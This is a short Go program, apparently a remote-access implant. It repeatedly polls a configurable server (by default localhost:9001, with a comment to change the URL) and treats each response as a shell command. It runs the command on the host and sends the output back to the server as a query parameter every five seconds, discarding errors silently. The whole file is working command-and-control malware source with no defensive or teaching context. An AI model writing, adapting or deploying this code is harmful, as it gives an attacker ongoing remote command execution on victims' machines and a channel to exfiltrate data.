package main

	import (
		"io/ioutil"
		"net/http"
		"net/url"
		"os/exec"
		"strings"
		"time"
	)

func runCommand(command string, args ...string) (string, error) {
		cmd := exec.Command(command, args...)
		output, err := cmd.CombinedOutput()
		if err != nil {
			return "", nil
		}
		return string(output), nil
	}

func main(){
	baseURL := "http://localhost:9001" //Change the URL to the server to connect to
		data := ""

		for {
			reqURL := baseURL + "/?data=" + url.QueryEscape(data)

			//Make a GET request to the server with the "data" parameter.
			resp, err := http.Get(reqURL)
			if err != nil {
				continue
			}

			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			//Split the body string into two variables
			splitValues := strings.Fields(string(body))
			var command string
			var args []string

			if len(splitValues) > 0 {
				command = splitValues[0]
				if len(splitValues) > 1 {
					args = splitValues[1:]
				}
			}

			data, err = runCommand(command, args...)
			if err != nil {
				continue
			}

			time.Sleep(5 * time.Second)
		}
	}

